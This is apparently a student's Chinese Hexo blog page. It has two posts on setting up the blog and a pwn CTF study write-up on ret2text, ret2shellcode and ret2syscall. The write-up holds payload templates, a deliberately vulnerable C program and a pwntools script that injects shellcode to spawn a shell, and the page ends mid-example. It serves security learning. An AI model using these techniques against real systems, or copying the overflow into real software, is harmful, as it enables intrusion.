<p>已算是把之前最开始进实验室叫搭博客，用了其他人的服务器直接整了一个从而混过去的债给还上了</p>
<p>不过这博客搭起来是真的麻烦，前前后后花了3天的晚上才整好（白天上课加玩去了）</p>
<p>这次整的博客用的主体是hexo+github整的一个静态博客，不得不说这个静态博客确实不如之前找同学整的那个动态的好，发文章也麻烦，问题还一大推，是真的烦。所幸最终还是把大概的给整出来了，也还算可以。</p>
<p>就用这遍文章将遇到大概写一下吧，当然主要还是将那些大佬的文章记录一下。</p>
<p><em>2.关于图片没有办法显示的</em></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/265077468">hexo博客如何插入图片 - 知乎 (zhihu.com)</a></p>
<p>这个是大佬，我用这个办法一下就成</p>
<p><em>3.关于换主题的</em></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385525053">hexo博客换主题 - 知乎 (zhihu.com)</a></p>
<p>这个也是一遍好文，我当时想直接通过，命令下，不过不成，就直接下压缩包，解压le</p>
<p><em>4.关于搭博客的基本</em></p>
<p>这个有很多了就不多写，放几篇好一点的</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1520557">这可能是迄今为止最全的hexo博客搭建教程-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a></p>
<p><em>5.关于第一次无法上传到github</em></p>
<p>这个真的是个大麻烦，当时怎么整都没有传上去，最后在有篇文章的评论里找到（真的离谱）</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a></p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327220751938.png" alt="image-20240327220751938"></p>
<p>好了这篇文章到这里差不多就结束了，如果以后再遇到问题，就在更这篇文章，</p>
<p>不过我的博客好像有点简陋，ε&#x3D;(´ο｀*)))唉，先不管，等以后有时间再慢慢整，</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221055613.png" alt="image-20240327221055613">痛，太痛了</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221127889.png" alt="image-20240327221127889"></p>
<p>好家伙，刚刚准备将这篇文章上传，然后准备润，就给我来了个大的，痛，痛，痛</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221350554.png" alt="image-20240327221350554"></p>
<p>行吧，在将这个问题解决一下，像这种一看就是在文章的开头写基本信息那出问题了，一般不是空格，就是英文符号整成中文的了，改吧，真的麻烦。所以关于这些空格和英文符号得好好整。啊！啊！第二次才改好。痛，痛，痛。</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2%E4%B9%8B%E7%97%9B/image-20240327221849389.png" alt="image-20240327221849389"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" rel="tag">搭博客</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%8D%9A%E5%AE%A2/">博客</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hexo" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/hexo/" class="article-date">
  	<time datetime="2024-03-27T13:14:28.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/hexo/">
        hexo基操
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="常用指令和发布文章"><a href="#常用指令和发布文章" class="headerlink" title="常用指令和发布文章"></a><strong>常用指令和发布文章</strong></h3><ul>
<li>常用指令</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="string">&quot;postName&quot;</span>        <span class="comment">//新建文章</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">&quot;pageName&quot;</span>        <span class="comment">//新建页面</span></span><br><span class="line">hexo g          <span class="comment">//生成静态页面至public目录</span></span><br><span class="line">hexo server         <span class="comment">//开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span></span><br><span class="line">hexo deploy         <span class="comment">//将.deploy目录部署到GitHub</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>常用组合</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">hexo d -g #生成部署</span><br><span class="line">hexo s -g #生成预览</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>发布文章</li>
</ul>
<p>终端<code>cd</code>到<code>blog</code>文件夹下，执行如下命令新建文章：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<p>名为<code>xxx.md</code>的文件会建在目录<code>.../blog/source/_posts</code>下。</p>
<p>所有的文章都会以<code>md</code>形式保存在<code>_post</code>文件夹中，只要在<code>_post</code>文件夹中新建<code>md</code>类型的文档，就能在执行<code>hexo g</code>的时候被渲染。新建的文章头需要添加一些信息，如下所示：（注意空格）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="attr">title</span>: xxx    <span class="comment">//在此处添加你的标题。</span></span><br><span class="line"><span class="attr">date</span>: <span class="number">2016</span>-<span class="number">10</span>-<span class="number">07</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">49</span>   <span class="comment">//在此处输入编辑这篇文章的时间。</span></span><br><span class="line"><span class="attr">tags</span>: xxx    <span class="comment">//在此处输入这篇文章的标签。</span></span><br><span class="line"><span class="attr">categories</span>: xxx    <span class="comment">//在此处输入这篇文章的分类。</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>复制</p>
<p>文章编辑完成后，终端<code>cd</code>到<code>blog</code>文件夹下，依次执行如下命令来发布：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>



<p>在使用git命令中器粘贴快捷键为shift+insert</p>
<p><img src="/2024/03/27/hexo/image-20240327212407451.png" alt="image-20240327212407451"></p>
<p>可以通过按鼠标左键的open git bash here召唤命令</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1520557">这可能是迄今为止最全的hexo博客搭建教程-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><img src="/2024/03/27/hexo/image-20240327211652140.png" alt="image-20240327211652140"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/hexo/">hexo</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/wp/" class="article-date">
  	<time datetime="2024-03-27T12:06:41.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/wp/">
        pwn 一些题详解
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#ret2text</p>
<p>主要分为32位的和64位的不同程序，在做法是有不同的对应方法与</p>
<p>在一开始都要先在linux中先确定程序使用了那些保护方式与结构类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件名</span><br></pre></td></tr></table></figure>
<p>![屏幕截图 2023-11-28 173641](wp&#x2F;屏幕截图 2023-11-28 173641-17115444455564.png)</p>
<p>![屏幕截图 2023-11-28 173737](wp&#x2F;屏幕截图 2023-11-28 173737.png)</p>
<p><em>1</em>，无论是32位还是64位都要首先确定栈溢出时要填充多少个垃圾数据，有两种方法，ida和动调</p>
<p>ida（在特定的环境下可能不对以动调的为主）：直接看所要溢出的那个栈在ida上与ebp的距离就是我们一开始要填从的数据的大小，注意在ida上显示的是16进制的数，在写脚本是要转化为10进制的数才能正确，如图要向buf中填充0x12（18）的数据才算覆盖到ebp的位置<br>![屏幕截图 2023-11-27 204046][wp&#x2F;屏幕截图 2023-11-27 204046.png]![屏幕截图 2023-11-27 204046](wp&#x2F;屏幕截图 2023-11-27 204046.png)</p>
<p>动调：gdb+可执行文件的名称，在运行到输入数据是输入较亮眼的数据，在之后看esp和ebp的距离，是为要注入的数据长。</p>
<p>现在注入的数据到达ebp所指向的地方但并没用完，由于栈的特点此时我们<br>还需要向其中再注入一段数据用于覆盖ebp所指向的地址，并且这段数据在不同系统中有不同的长度，在64位系统中要输入8个长度的数据，在32位系统中要输如4个长度的数据<br>以上的垃圾数据长度为一个字节（一个大写字母），用如下传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*长度的大小</span><br></pre></td></tr></table></figure>

<p>在确定垃圾数据的长度后在注入的数据便是之后程序要跳转执行的地方，在当下的情况下要让程序能执行system(&#x2F;bin&#x2F;sh)以获得控制权，如果在程序中有这个完整的函数，则在垃圾数据之后直接输入该函数的地址跳转到那执行就行，无论是32位还是64位都这样。函数的地址在ida中获得，用如下传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(<span class="number">0</span>x地址数字）用于<span class="number">32</span>位系统</span><br><span class="line">p64(<span class="number">0</span>x地址数据)用于<span class="number">64</span>位系统</span><br></pre></td></tr></table></figure>

<p><strong>函数传参</strong><br>在很多情况下程序中并不会直接有system(&#x2F;bin&#x2F;sh)这个函数，而是将这system和&#x2F;bin&#x2F;sh放在不同的地方，需要我们将这两个同过地址的连在一起，用于执行，而此处32为系统与64为系统便是完全不同的方式进行，分开论述。</p>
<p><em>32位系统</em>pit<br>在将垃圾数据输入进去之后直接输入到system函所在的地址（切记要输入的是该函数在plt段的地址，不能是text段的地址）<br>此时当程序执行到这里时会直接进入该函数的内部此时我们只要再输入字符串（&#x2F;bin&#x2F;sh）的位置程序便会执行该函数，但在输入字符串之前还要输入一个0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p32(plt段的system的地址)</span><br><span class="line">+p32(<span class="number">0</span>)+p32(.data段的/bin/sh的地址)</span><br></pre></td></tr></table></figure>
<p>关于0的加入：<br>对于本题的函数传参，我们的栈帧构造初步想法如图</p>
<p>ebp	‘aaaa’<br>r	return to func<br>参数一	“&#x2F;bin&#x2F;sh”<br>输入适量垃圾填充 padding * b ‘a’<br>覆盖返回地址指向func函数 p32(ret_addr)<br>参数”&#x2F;bin&#x2F;sh”地址<br>则payload &#x3D;  padding*b’a’ + p32(ret_addr)  + p32(sh_addr)</p>
<p>然而这样的脚本在攻击时会出错。原因在于：</p>
<p>正常的函数调用call来达到push eip；jmp的作用，经过初步payload构造的攻击如下图所示，是通过覆盖return达到jmp的作用的，并没有像call一样push eip到栈中。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/4234700732.png" alt="38e10a9971624ec18cd2d549954ca408.png"><img src="/2024/03/27/wp/38e10a9971624ec18cd2d549954ca408.png" alt="38e10a9971624ec18cd2d549954ca408"><br> 故而ret执行后，ebp后为我们输入的参数而非eip原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用ret2text覆盖pwn题时候，需要自行加入一行栈帧的填充。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/1648215160.png" alt="701953734d034bbe98efac9dc5c6f836.png"><img src="/2024/03/27/wp/701953734d034bbe98efac9dc5c6f836.png" alt="701953734d034bbe98efac9dc5c6f836"><br><em>64位系统</em><br>在64位的中在将垃圾数据写入之后，我们要将&#x2F;bin&#x2F;sh这段数据先写入到一个寄存器中然后将这个寄存器导入到函数中程序才能·执行<br>于是要做的第一步就是找到一个寄存器并修改其中的值，使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/11/803004082.png" alt="屏幕截图 2023-11-28 195354.png">![屏幕截图 2023-11-28 195354](wp&#x2F;屏幕截图 2023-11-28 195354.png)<br>通过这个我们可以找的程序中可以给我们使用·修改寄存器的命令的地址<br>在这里我们只用传一段函数于是只要用pop rdi；ret一个指令将rdi中的值修改，然后便是在栈中放入‘bin&#x2F;sh’经由pop提交给rdi，最后便是填system的地址（在这里要填入的不能是plt段的system函数的地址，要填的是.data段中的call system的地址，因为在之前将&#x2F;bin&#x2F;sh的地址填入其中从而导入rdi中，如果要rdi中的数据能进入system中则要用call system，将rdi中值导入system然后在执行该函数)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p64(pop|ret的地址)+</span><br><span class="line">p64(.data段中的/bin/sh的地址)+p64(.data段中的call system的地址)</span><br></pre></td></tr></table></figure>

<p>#ret2shellcode<br>在这一类题中不会出现system和&#x2F;bin&#x2F;sh这种直接可以用来控制的函数，但程序中有一部分是可读可写可执行的部分，这一部分在程序中是很危险的一部分，一旦出现这种地方，同时含有栈溢出，便可以在通过栈溢出之后使程序跳到那部分可读可写可执行的部分，我们在往里面输入我们shellcode（意为一段恶意程序，通过执行这一段恶意程序，获得控制权）</p>
<p>关于可读可写可执行段的查找可以在gdb调式程序的过程中用vmmap指令查找<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3104877570.png" alt="屏幕截图 2023-11-30 143610.png">![屏幕截图 2023-11-30 143610](wp&#x2F;屏幕截图 2023-11-30 143610.png)<br>如图便可以查找到从0x601000到0x602000是可读可写可执行（一下称为rwx)的程序，我们便可以将shellcode写入到这段程序</p>
<p>有的时候这个程序不一定在一开始写的时候便有rwx段程序，但在执行时会因为那个指令出现rwx段程序，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br></pre></td></tr></table></figure>
<p>这个指令将0x601000之后的0x100段数据都改为rwx程序于是我们便可以想这段之中写入我们的shellcode，在通过栈溢出使他执行这一段程序。</p>
<p><strong>shellcode</strong><br>一段恶意程序，可以在pwntools中获得比较简单的一些，执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.sh()<span class="comment">//默认为32位的如果要64位执行下面这个</span></span><br><span class="line">shellcraft.amd64.sh()<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/11/2163217567.png" alt="屏幕截图 2023-11-30 145900.png">![屏幕截图 2023-11-30 145900](wp&#x2F;屏幕截图 2023-11-30 145900.png)<br>此时我们获得不过是汇编语言不能直接传入程序中，必须将它换为机器语言传入才能穿入成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">这样输出的便是机器语言的shellcode，直接传入其中便可以使用</span><br></pre></td></tr></table></figure>
<p>在64位的是可能会因为其环境默认为32位的而出现问题可以通过如下修改<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3832015840.png" alt="屏幕截图 2023-11-30 150708.png">![屏幕截图 2023-11-30 150708](wp&#x2F;屏幕截图 2023-11-30 150708.png)</p>
<p><strong>例题</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc poc.c -o poc -no-pie -fno-stack-protector</span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">initt</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">		setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">		<span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pwnn</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;please pwn me!!!&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InputName</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;inputs you name&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,shellcode,<span class="number">100</span>);</span><br><span class="line">		mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	initt();</span><br><span class="line">	InputName();</span><br><span class="line">	pwnn();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这段程序中先执行InputName函数，在这个函数中，同构read向shellcode中可以输入最长100字节的数据，然后我们会发现他将0x601000之后100的数据改为rwx段，在ida中正好可以看到shellcode段的数据刚好在这其中，我们便可以通过这个向其中输入shellcode，在pwnn这个函数中正好有栈溢出的存在，<br>于是便可以先通过InputName函数输入shellcode然后再pwnn中栈溢出指向<br>shellcode的地址<br>攻击如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span><span class="comment">//更改环境</span></span><br><span class="line">bss=<span class="number">0x6010A0</span><span class="comment">//shellcode的地址</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(bss)<span class="comment">//溢出并指向地址</span></span><br><span class="line">binsh=<span class="keyword">asm</span>(shellcraft.amd64.sh())构建shellcode</span><br><span class="line">io.send(binsh)<span class="comment">//先将shellcode传入rwx段中</span></span><br><span class="line">io.recv()<span class="comment">//由于是两段输入中间一个做间隔</span></span><br><span class="line">io.send(payload)<span class="comment">//进行栈溢出</span></span><br><span class="line">io.interactive()<span class="comment">//交互</span></span><br></pre></td></tr></table></figure>
<p>在这一类题中有一个必须注意的事，shellcraft注入的地方最好是bss区，在这题中便是注入到bss区中的，虽然可以注入到栈上但栈上的保护过多最好不要注入到栈中</p>
<p>#ret2syscall<br>来吧趁今天有点时间把欠了一个星期的博客给补了<br>syscall相当于是一个系统中的命令，可以在与其他寄存器相配合的情况下完成系统调令，在程序没有system和&#x2F;bin&#x2F;sh时使用。<br>在系统中要取得控制权常用的方法是执行system（&#x2F;bin&#x2F;sh）指令，但很多情况下程序是一般不会有这个指令的，此时便可以看是不是可以通过向rwx段注入shellcode来获得控制权，但程序一般也不会有这种地方此时便可以开始考虑ret2syscall的方法，但这种方法夜有很大的局限性，一般只能在静态链接中使用，很少在动态链接中使用，虽然也不是不可以（之后便会讲一题用动态链接的题虽然在一定程度上那题可以算ret2csu的题但本质上还算用syscall可以做的题），</p>
<p>ret2syscall的本质就是让部分寄存器中的值变为特殊值从而使程序执行一个系统调令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
<p>大致就是这个但现在我们要面临的问题是如何修改寄存器中的值，这个有一个很好的方法。可以在终端中运行rop便可以找到程序中的可以帮我们修改寄存器的指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/12/1839070299.png" alt="屏幕截图 2023-12-09 160956.png">![屏幕截图 2023-12-09 160956](wp&#x2F;屏幕截图 2023-12-09 160956.png)</p>
<p>如此便可以查看在程序中有那些可以供我们去修改寄存器的命令（像这种用于修改寄存器的指令一般被称为gadget），我们只要在栈溢出的垃圾值后面加入这些指令，pop+寄存器的意思是将此时栈上的值取出放入寄存器中，ret的作用是返回栈中，回到我们自己的指令去继续执行我们的指令，而要放入寄存器中的值则只要放在这个指令地址的后面，在程序执行时会将这个指令的后面的那个值作为出栈的数据放入寄存器中。需要注意的是在命令中可能不止一个寄存器，此时我们变要将每一个寄存器的值都改变，便在寄存器命令后面以此放上要放入寄存器的值，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000405b44</span> : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">这是用上面的那个指令运行后出现的一行数据</span><br><span class="line">我们的利用</span><br><span class="line">p32(<span class="number">0x0000000000405b44</span>)+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">9</span>)+p32(<span class="number">0x3d</span>)</span><br></pre></td></tr></table></figure>
<p>如此当被我们劫持的程序执行到这里时，便会依次将2，0，9，0x3d这四个数据分别放入rbx,rbp,r12,r13这四个寄存器中，然后ret会将程序返回到原本的指令中。</p>
<p>有了以上的分析其实像这种题的过程便可以很清晰的出来了，<br>32位程序：<br>先输入垃圾数据然后，寻找足够的gadget将eax的值改为0xb，ebx改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）ecx改为0，edx改为0。<br>在这4个寄存器的值都改好后便可以执行int 0x80这个指令，获得控制权·<br>64位程序：<br>先输入垃圾数据然后，寻找足够的gadget将rax的值改为0x3b，rbi改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）rsi改为0，rdx改为0。<br>在这4个寄存器的值都改好后便可以执行syscall这个指令，获得控制权·</p>
<p>如上便是ret2syscall这类题的做法，其实细看回事有很大的限制在其中<br>1，要有足够将4个寄存器都修改的gadget，这一点便基本将动态链接给淘汰了，在大部分的动态链接中是没有足够多的gadget给我们使用的，只用静态链接中才会有足够时的gadget<br>2，在程序中必须有int 0x80（32位程序）或syscall（64位程序）指令</p>
<p>现在便拿出一道方法用的是ret2syscall但其中用了ret2csu的思想的一道动态链接的64位程序的（神奇）题</p>
<p>老样子先用checksec查看程序的保护（这道题是学长给的，在一开始题目就是ret2syscall虽然我一度怀疑题目错了，但最后确实没错，在后面为了好输入我改成poc）<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1565444552.png" alt="屏幕截图 2023-12-09 170220.png">![屏幕截图 2023-12-09 170220](wp&#x2F;屏幕截图 2023-12-09 170220.png)<br>没什么特别的那就直接开整吧，</p>
<p>既然是ret2syscall那就找gadget，这里便是我懵逼的第一个地方，如此少的gadget，只能找到修改rdi和rsi的指令器外两个寄存器的值该怎么改？（拿命改），<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3017193538.png" alt="屏幕截图 2023-12-09 171431.png">![屏幕截图 2023-12-09 171431](wp&#x2F;屏幕截图 2023-12-09 171431.png)</p>
<p>先不管将程序放入64位的ida中<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3385520804.png" alt="屏幕截图 2023-12-09 172045.png">![屏幕截图 2023-12-09 172045](wp&#x2F;屏幕截图 2023-12-09 172045.png)<br>果然，一看左边这么少的函数就知道是个动态链接的程序，<br>返回到汇编的窗口仔细一找woc居然有syscall指令<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1100300480.png" alt="屏幕截图 2023-12-09 172639.png">![屏幕截图 2023-12-09 172639](wp&#x2F;屏幕截图 2023-12-09 172639.png)<br>but在参数一栏找发现没有&#x2F;bin&#x2F;sh<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1868602236.png" alt="屏幕截图 2023-12-09 172745.png">![屏幕截图 2023-12-09 172745](wp&#x2F;屏幕截图 2023-12-09 172745.png)<br>这便是我疑惑的第2个地方，后来问了学长才知道，在主程序中有gets函数便可以在劫持程序后利用gets函数将&#x2F;bin&#x2F;sh这个字符串输入到bss段中的空地址中，然后再调用。</p>
<p>好到现在来总结一下，我们能使用的有<br>syscall命令，<br>rdi和rsi寄存器，<br>用gets函数输入&#x2F;bin&#x2F;sh，<br>如果不考虑ret2libc的话，还差rax和rdx寄存器的改变</p>
